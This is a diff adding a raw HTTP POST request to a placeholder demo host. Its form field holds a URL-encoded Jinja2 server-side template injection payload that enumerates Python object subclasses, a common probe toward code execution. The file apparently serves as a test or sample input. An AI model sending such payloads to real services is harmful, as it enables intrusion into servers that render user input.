@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+Connection: close
+
+data=%7B%25+for+x+in+%28%29.__class__.__base__.__subclasses__%28%29+%25%7D%7B%25+endfor+%25%7D
